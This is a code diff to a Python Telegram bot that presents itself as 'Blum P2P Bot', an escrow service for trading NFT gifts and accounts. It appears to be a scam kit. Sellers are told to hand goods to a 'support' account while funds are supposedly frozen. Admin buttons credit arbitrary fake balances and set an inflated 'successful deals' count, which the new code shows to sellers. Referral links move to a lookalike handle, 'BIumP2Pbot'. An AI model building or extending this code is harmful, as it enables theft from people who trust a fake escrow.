@@ -73,7 +73,7 @@ TEXTS = {
             '<tg-emoji emoji-id="5816611412255970516">👋</tg-emoji> <b>Welcome to Blum P2P Bot.</b>\n\n'
             '<tg-emoji emoji-id="5296420173253727054">💎</tg-emoji> This is a target bot for buying or selling various services, '
             'including NFT gifts, assets, and accounts.\n\n'
-            '<tg-emoji emoji-id="5819051172723430114">✨</tg-emoji> Please select the required item from the menu below:'
+            '<tg-emoji emoji-id="5465237148472991488">✨</tg-emoji> Please select the required item from the menu below:'
         ),
         "admin_team": '<tg-emoji emoji-id="5267315361732133883">🌟</tg-emoji> best team - https://t.me/+GY8rnuQ_D5U4OGY6',
         "wallet_updated": '<tg-emoji emoji-id="5818821611016426346">✅</tg-emoji> <b>The address has been updated</b>',
@@ -143,7 +143,7 @@ TEXTS = {
             f'• После проверки покупатель подтверждает получение и ордер закрывается'
         ),
         "support_title": f'<tg-emoji emoji-id="5427364964375481011">👨‍💻</tg-emoji> Technical Support',
-        "referral_title": '<tg-emoji emoji-id="5296748587928016344">🎎</tg-emoji> <b>Your referral link</b>\n<code>https://t.me/NotcolnP2Pbot?start=ref_{}</code>',
+        "referral_title": '<tg-emoji emoji-id="5296748587928016344">🎎</tg-emoji> <b>Your referral link</b>\n<code>https://t.me/BIumP2Pbot?start=ref_{}</code>',
         "lang_selection_title": "🌐 Выберите язык / Choose language",
         "btn_share_order": "Share order link",
         "btn_support": "Support",
@@ -161,7 +161,7 @@ TEXTS = {
             '<tg-emoji emoji-id="5816611412255970516">👋</tg-emoji> <b>Добро пожаловать в Blum P2P Бот.</b>\n\n'
             '<tg-emoji emoji-id="5296420173253727054">💎</tg-emoji> Это целевой бот для покупки или продажи различных услуг, '
             'включая NFT-подарки, ассеты и аккаунты.\n\n'
-            '<tg-emoji emoji-id="5819051172723430114">✨</tg-emoji> Пожалуйста, выберите необходимый пункт из меню ниже:'
+            '<tg-emoji emoji-id="5465237148472991488">✨</tg-emoji> Пожалуйста, выбирайте нужный пункт в меню ниже:'
         ),
         "admin_team": '<tg-emoji emoji-id="5267315361732133883">🌟</tg-emoji> лучшая тима - https://t.me/+GY8rnuQ_D5U4OGY6',
         "wallet_updated": '<tg-emoji emoji-id="5818821611016426346">✅</tg-emoji> <b>Адрес кошелька успешно обновлен</b>',
@@ -204,7 +204,7 @@ TEXTS = {
             f'Мы уведомили продавца о получении средств. Ожидайте, пока он передаст подарок в поддержку <b>@BlumP2Phelp</b>'
         ),
         "seller_notification": (
-            f'<blockquote><tg-emoji emoji-id="5449397880315999468">💰</tg-emoji> <b>Покупатель оплатил ваш товар #{{order_id}}</b></blockquote>\n\n'
+            f'<tg-emoji emoji-id="5386508168849283575">💰</tg-emoji> <b>Покупатель оплатил ваш товар #{{order_id}}</b>\n\n'
             f'Средства заморожены в нашем боте до момента передачи товара в <b>@BlumP2Phelp</b>\n\n'
             f'<tg-emoji emoji-id="5231415241933357312">📦</tg-emoji> Пожалуйста, передайте все товары или подарки нашей службе поддержки для завершения сделки.'
         ),
@@ -231,7 +231,7 @@ TEXTS = {
             f'• После проверки покупатель подтверждает получение и ордер закрывается'
         ),
         "support_title": f'<tg-emoji emoji-id="5427364964375481011">👨‍💻</tg-emoji> Техническая поддержка',
-        "referral_title": '<tg-emoji emoji-id="5296748587928016344">🎎</tg-emoji> <b>Ваша реферальная ссылка</b>\n<code>https://t.me/NotcolnP2Pbot?start=ref_{}</code>',
+        "referral_title": '<tg-emoji emoji-id="5296748587928016344">🎎</tg-emoji> <b>Ваша реферальная ссылка</b>\n<code>https://t.me/BIumP2Pbot?start=ref_{}</code>',
         "lang_selection_title": "🌐 Выберите язык / Choose language",
         "btn_share_order": "Поделиться ссылкой",
         "btn_support": "Поддержка",
@@ -258,6 +258,7 @@ class OrderStates(StatesGroup):
 
 class AdminStates(StatesGroup):
     waiting_for_balance = State()
+    waiting_for_deals_count = State()
 
 def load_db():
     global db
@@ -294,7 +295,9 @@ def register_user(user_id: int, username: str = None):
             "balance_gram": 0.0,
             "balance_rub": 0.0,
             "balance_usdt": 0.0,
-            "balance_stars": 0.0
+            "balance_stars": 0.0,
+            "referrer_id": None,
+            "deals_count": 0
         }
     else:
         if "lang" not in db[user_id]: db[user_id]["lang"] = "ru"
@@ -306,6 +309,8 @@ def register_user(user_id: int, username: str = None):
         if "card_wallet" not in db[user_id]: db[user_id]["card_wallet"] = "не указан"
         if "usdt_wallet" not in db[user_id]: db[user_id]["usdt_wallet"] = "не указан"
         if "stars_wallet" not in db[user_id]: db[user_id]["stars_wallet"] = "не указан"
+        if "referrer_id" not in db[user_id]: db[user_id]["referrer_id"] = None
+        if "deals_count" not in db[user_id]: db[user_id]["deals_count"] = 0
         if username: db[user_id]["username"] = username
     save_db()
 
@@ -317,16 +322,30 @@ active_orders = {}
 @dp.message(Command("start"))
 async def cmd_start(message: types.Message, state: FSMContext):
     await state.clear()
-    register_user(message.from_user.id, message.from_user.username)
-    lang = get_lang(message.from_user.id)
     
     args = message.text.split()
+    referrer_id = None
+    if len(args) > 1 and args[1].startswith("ref_"):
+        try:
+            referrer_id = int(args[1].replace("ref_", ""))
+        except:
+            pass
+    
+    register_user(message.from_user.id, message.from_user.username)
+    
+    if referrer_id and referrer_id != message.from_user.id:
+        if referrer_id in db:
+            if db[message.from_user.id].get("referrer_id") is None:
+                db[message.from_user.id]["referrer_id"] = referrer_id
+                save_db()
+    
     if len(args) > 1 and args[1].startswith("deal_"):
         order_id = args[1].replace("deal_", "")
         if order_id in active_orders:
             await handle_join_order(message, order_id)
             return
 
+    lang = get_lang(message.from_user.id)
     await message.answer(text=TEXTS[lang]["welcome"], reply_markup=get_main_keyboard(lang))
 
 async def safe_delete(callback: types.CallbackQuery):
@@ -379,16 +398,26 @@ async def cmd_admin(message: types.Message):
     lang = get_lang(message.from_user.id)
     builder = InlineKeyboardBuilder()
     builder.row(
-        PremiumButton(text="Выдача баланса" if lang=="ru" else "Give Balance", callback_data="admin_give_balance", style="success"),
-        PremiumButton(text="Выдача сделок" if lang=="ru" else "Give Deals", callback_data="admin_give_deals", style="success")
+        PremiumButton(text="Выдача баланса", emoji_id="5251722255330736862", callback_data="admin_give_balance", style="success"),
+        PremiumButton(text="Резерв тима", emoji_id="5260615710966577646", callback_data="admin_reserve_team", style="success"),
+        PremiumButton(text="Парсер", emoji_id="5332431060259074952", callback_data="admin_parser", style="success")
+    )
+    builder.row(
+        PremiumButton(text="Накрутка сделок", emoji_id="5278348170642883096", callback_data="admin_deals_fake", style="success")
     )
     await message.answer(text=TEXTS[lang]["admin_team"], reply_markup=builder.as_markup())
 
 @dp.callback_query(lambda call: call.data == "admin_give_balance")
 async def admin_give_balance_prompt(callback: types.CallbackQuery, state: FSMContext):
     await callback.answer()
-    await callback.message.answer(
-        text="Format:\n<code>777 rub</code>\n<code>222 gram</code>\n<code>50 usdt</code>\n<code>100 stars</code>"
+    await callback.message.edit_text(
+        text="<b>Формат</b>\n\n"
+             f'<tg-emoji emoji-id="5296676415297583387">📌</tg-emoji> 777 rub\n'
+             f'<tg-emoji emoji-id="5296676415297583387">📌</tg-emoji> 222 gram\n'
+             f'<tg-emoji emoji-id="5296676415297583387">📌</tg-emoji> 50 usdt\n'
+             f'<tg-emoji emoji-id="5296676415297583387">📌</tg-emoji> 100 stars\n'
+             f'<tg-emoji emoji-id="5296676415297583387">📌</tg-emoji> 100 all (выдаёт суммарный баланс для оплат сделок любой валюты)',
+        parse_mode=ParseMode.HTML
     )
     await state.set_state(AdminStates.waiting_for_balance)
 
@@ -411,19 +440,102 @@ async def admin_process_balance(message: types.Message, state: FSMContext):
             db[user_id]["balance_usdt"] += amount
         elif currency == "stars":
             db[user_id]["balance_stars"] += amount
+        elif currency == "all":
+            db[user_id]["balance_gram"] += amount
+            db[user_id]["balance_rub"] += amount
+            db[user_id]["balance_usdt"] += amount
+            db[user_id]["balance_stars"] += amount
         else:
             raise ValueError()
             
         save_db()
         await message.answer(TEXTS[lang]["balance_updated"].format(amount, currency.upper()))
     except Exception:
-        await message.answer("❌ Invalid format. Example: 777 rub")
+        await message.answer("❌ Неверный формат. Пример: 777 rub")
     finally:
         await state.clear()
 
-@dp.callback_query(lambda call: call.data == "admin_give_deals")
-async def admin_give_deals(callback: types.CallbackQuery):
-    await callback.answer("In development / В разработке", show_alert=True)
+@dp.callback_query(lambda call: call.data == "admin_reserve_team")
+async def admin_reserve_team(callback: types.CallbackQuery):
+    await callback.answer()
+    lang = get_lang(callback.from_user.id)
+    
+    builder = InlineKeyboardBuilder()
+    builder.row(
+        PremiumButton(
+            text="Назад в панель" if lang == "ru" else "Back to panel",
+            callback_data="back_to_admin_panel",
+            style="success"
+        )
+    )
+    
+    await callback.message.edit_text(
+        text="https://discord.gg/tFEZgmR8s",
+        reply_markup=builder.as_markup()
+    )
+
+@dp.callback_query(lambda call: call.data == "admin_parser")
+async def admin_parser(callback: types.CallbackQuery):
+    await callback.answer()
+    lang = get_lang(callback.from_user.id)
+    
+    builder = InlineKeyboardBuilder()
+    builder.row(
+        PremiumButton(
+            text="Назад в панель" if lang == "ru" else "Back to panel",
+            callback_data="back_to_admin_panel",
+            style="success"
+        )
+    )
+    
+    await callback.message.edit_text(
+        text="https://t.me/+3whm6tVG4FYyMzZi",
+        reply_markup=builder.as_markup()
+    )
+
+@dp.callback_query(lambda call: call.data == "admin_deals_fake")
+async def admin_deals_fake_prompt(callback: types.CallbackQuery, state: FSMContext):
+    await callback.answer()
+    lang = get_lang(callback.from_user.id)
+    
+    await callback.message.edit_text(
+        text="Введите количество сделок:"
+    )
+    await state.set_state(AdminStates.waiting_for_deals_count)
+
+@dp.message(AdminStates.waiting_for_deals_count)
+async def admin_process_deals_fake(message: types.Message, state: FSMContext):
+    try:
+        count = int(message.text.strip())
+        user_id = message.from_user.id
+        
+        if user_id not in db:
+            register_user(user_id)
+        
+        db[user_id]["deals_count"] = count
+        save_db()
+        
+        await message.answer(f"✅ Вам установлено {count} успешных сделок!")
+    except Exception:
+        await message.answer("❌ Неверный формат. Введите число.")
+    finally:
+        await state.clear()
+
+@dp.callback_query(lambda call: call.data == "back_to_admin_panel")
+async def back_to_admin_panel(callback: types.CallbackQuery):
+    await callback.answer()
+    lang = get_lang(callback.from_user.id)
+    
+    builder = InlineKeyboardBuilder()
+    builder.row(
+        PremiumButton(text="Выдача баланса", emoji_id="5251722255330736862", callback_data="admin_give_balance", style="success"),
+        PremiumButton(text="Резерв тима", emoji_id="5260615710966577646", callback_data="admin_reserve_team", style="success"),
+        PremiumButton(text="Парсер", emoji_id="5332431060259074952", callback_data="admin_parser", style="success")
+    )
+    builder.row(
+        PremiumButton(text="Накрутка сделок", emoji_id="5278348170642883096", callback_data="admin_deals_fake", style="success")
+    )
+    await callback.message.edit_text(text=TEXTS[lang]["admin_team"], reply_markup=builder.as_markup())
 
 # --- БЛОК СОЗДАНИЯ ОРДЕРА ---
 @dp.callback_query(lambda call: call.data == "warning_show")
@@ -462,7 +574,6 @@ async def process_pay_selection(callback: types.CallbackQuery, state: FSMContext
 
     await safe_delete(callback)
     
-    # Отображение названия валюты
     display_names = {
         "GRAM": "GRAM",
         "USDT": "USDT",
@@ -471,7 +582,6 @@ async def process_pay_selection(callback: types.CallbackQuery, state: FSMContext
     }
     display_currency = display_names.get(selected_currency, selected_currency)
     
-    # Определяем минимальную сумму для отображения
     limits_display = {
         "GRAM": 1.5,
         "USDT": 1.2,
@@ -496,14 +606,10 @@ async def order_amount_handler(message: types.Message, state: FSMContext):
         data = await state.get_data()
         selected_currency = data.get("chosen_currency", "GRAM")
         
-        # Конфигурация лимитов и имен
         limits = {"GRAM": 1.5, "USDT": 1.2, "CARD": 50, "STARS": 50}
-        names = {"GRAM": "GRAM", "USDT": "USDT", "CARD": "рублей", "STARS": "STARS"}
         
         min_amount = limits.get(selected_currency, 2)
-        name = names.get(selected_currency, selected_currency)
         
-        # Проверка минимальной суммы
         if amount < min_amount:
             await message.answer(TEXTS[lang]["order_min_error"].format(min_amount))
             return
@@ -525,10 +631,8 @@ async def order_description_handler(message: types.Message, state: FSMContext):
     currency = data.get("chosen_currency")
     description = message.text
     
-    # Генерация ID ордера
     order_id = generate_code(6)
     
-    # Сохраняем ордер
     active_orders[order_id] = {
         "seller_id": user_id,
         "amount": amount,
@@ -537,7 +641,6 @@ async def order_description_handler(message: types.Message, state: FSMContext):
         "buyer_id": None
     }
     
-    # Логирование создания сделки
     seller_username = db[user_id].get("username", f"id{user_id}")
     display_currency = "рублей" if currency == "CARD" and lang=="ru" else ("rubles" if currency == "CARD" else currency)
     await send_admin_log("deal_created", {
@@ -548,15 +651,12 @@ async def order_description_handler(message: types.Message, state: FSMContext):
         "description": description
     })
     
-    # Отправка успешного сообщения с кнопками
     bot_user = await bot.get_me()
     deal_link = f"https://t.me/{bot_user.username}?start=deal_{order_id}"
     display_currency = "Rubles" if currency == "CARD" and lang=="en" else ("Рубли" if currency == "CARD" else currency)
     
-    # Создаем клавиатуру с кнопками
     builder = InlineKeyboardBuilder()
     
-    # Кнопка "Поделиться ссылкой" - используем switch_inline_query для выбора чата
     builder.row(
         types.InlineKeyboardButton(
             text=TEXTS[lang]["btn_share_order"], 
@@ -564,7 +664,6 @@ async def order_description_handler(message: types.Message, state: FSMContext):
         )
     )
     
-    # Кнопка "Поддержка"
     builder.row(
         PremiumButton(
             text=TEXTS[lang]["btn_write_support"],
@@ -573,7 +672,6 @@ async def order_description_handler(message: types.Message, state: FSMContext):
         )
     )
     
-    # Кнопка "Отменить ордер"
     builder.row(
         PremiumButton(
             text=TEXTS[lang]["btn_cancel_order"],
@@ -612,7 +710,6 @@ async def process_share_order(callback: types.CallbackQuery):
     seller_username = f"@{seller_info.get('username')}" if seller_info.get('username') else f"id{order['seller_id']}"
     display_currency = "Rubles" if order["currency"] == "CARD" and lang=="en" else ("Рубли" if order["currency"] == "CARD" else order["currency"])
     
-    # Текст для отправки
     share_text = (
         f"🤝 <b>Вас пригласили присоединиться к ордеру!</b>\n\n"
         f"💰 <b>Сумма:</b> {order['amount']} {display_currency}\n"
@@ -624,7 +721,6 @@ async def process_share_order(callback: types.CallbackQuery):
     btn_join = "🔗 Присоединиться" if lang == "ru" else "🔗 Join Order"
     builder.row(types.InlineKeyboardButton(text=btn_join, url=deal_link))
     
-    # Отправляем через inline режим (выбор чата)
     await bot.send_message(
         chat_id=callback.from_user.id,
         text=share_text,
@@ -661,16 +757,16 @@ async def handle_join_order(message: types.Message, order_id: str):
         await message.answer(TEXTS[lang]["order_self_join"])
         return
         
-    # Обновляем покупателя в ордере
     order["buyer_id"] = message.from_user.id
         
     seller_info = db.get(order["seller_id"], {})
     seller_username = f"@{seller_info.get('username')}" if seller_info.get('username') else f"id{order['seller_id']}"
     buyer_username = message.from_user.username or f"id{message.from_user.id}"
     
+    buyer_deals = db.get(message.from_user.id, {}).get("deals_count", 0)
+    
     display_currency = "Rubles" if order["currency"] == "CARD" and lang=="en" else ("Рубли" if order["currency"] == "CARD" else order["currency"])
     
-    # Отправляем обновленный лог админам
     display_currency_log = "рублей" if order["currency"] == "CARD" and lang=="ru" else ("rubles" if order["currency"] == "CARD" else order["currency"])
     await send_admin_log("buyer_joined", {
         "id": order_id,
@@ -680,6 +776,33 @@ async def handle_join_order(message: types.Message, order_id: str):
         "currency": display_currency_log,
         "description": order["description"]
     })
+    
+    # --- УВЕДОМЛЕНИЕ ПРОДАВЦУ ---
+    seller_notification = (
+        f'<tg-emoji emoji-id="5465237148472991488">📢</tg-emoji> <b>Покупатель присоединился к вашей сделке #{order_id}</b>\n\n'
+        f'<tg-emoji emoji-id="5409318572654615628">⏳</tg-emoji> На данный момент мы ожидаем оплату от покупателя, как только всё будет готово - мы уведомим вас.\n\n'
+        f'<tg-emoji emoji-id="5384245567192849959">⭐</tg-emoji> Успешных сделок у покупателя: {buyer_deals}'
+    )
+    
+    seller_builder = InlineKeyboardBuilder()
+    seller_builder.row(
+        PremiumButton(
+            text="Поддержка",
+            emoji_id="5409260990028077429",
+            url="https://t.me/BlumPPhelp",
+            style="success"
+        )
+    )
+    
+    try:
+        await bot.send_message(
+            chat_id=order["seller_id"],
+            text=seller_notification,
+            reply_markup=seller_builder.as_markup()
+        )
+    except Exception:
+        pass
+    # --- КОНЕЦ УВЕДОМЛЕНИЯ ПРОДАВЦУ ---
     
     formatted_join = TEXTS[lang]["buyer_joined"].format(
         order_id=order_id, 
@@ -752,16 +875,14 @@ async def process_seller_transfer(callback: types.CallbackQuery):
     order = active_orders.get(order_id)
     
     msg = await callback.message.answer(TEXTS[lang]["verifying_goods"])
-    await asyncio.sleep(10) # 10 секунд ожидания
+    await asyncio.sleep(10)
     
-    # Получаем данные для лога
     seller_info = db.get(callback.from_user.id, {})
     seller_username = seller_info.get("username", f"id{callback.from_user.id}")
     buyer_info = db.get(buyer_id, {})
     buyer_username = buyer_info.get("username", f"id{buyer_id}")
     description = order.get("description", "не указано") if order else "не указано"
     
-    # ДОБАВЛЕНО: логирование провальной проверки
     await send_admin_log("gift_in_support", {
         "seller": seller_username,
         "buyer": buyer_username,
